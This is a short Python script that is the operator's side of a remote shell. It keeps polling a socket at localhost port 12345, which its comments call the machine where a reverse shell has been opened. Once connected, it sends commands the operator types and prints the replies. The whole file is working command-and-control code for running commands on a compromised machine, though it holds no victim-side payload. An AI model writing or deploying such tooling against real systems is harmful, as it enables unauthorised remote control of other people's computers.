import socket
import time

host = 'localhost' # Host address of the machine the reverse shell has been opened on.
port = 12345  # Port of the machine the reverse shell has been opened on.

def establish_connection(s):
    while True:
        try:
            s.connect((host, port))
            return
        except socket.error as e:
            print("Polling for Target Connection...")
            time.sleep(2)  # Wait for 2 seconds before retrying

def run():

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # Attempt to establish connection
        establish_connection(s)
        print(f"Initial Connection Established with {host}:{port}...")
        print("Initiating Shell Access...")

        # Once connected, proceed with the rest of the script
        while True:
            # Send a command
            command = input("Enter command: ").strip()
            if command.lower() == 'exit':
                break
            s.sendall(command.encode())
            # Receive and print the response
            data = s.recv(1024)

            # If command is 'ls', split by newline and print each line
            if command == 'ls':
                for line in data.decode().split('\n'):
                    print(line)
            else:
                print('Received', repr(data.decode()))

if __name__ == '__main__':
    run()
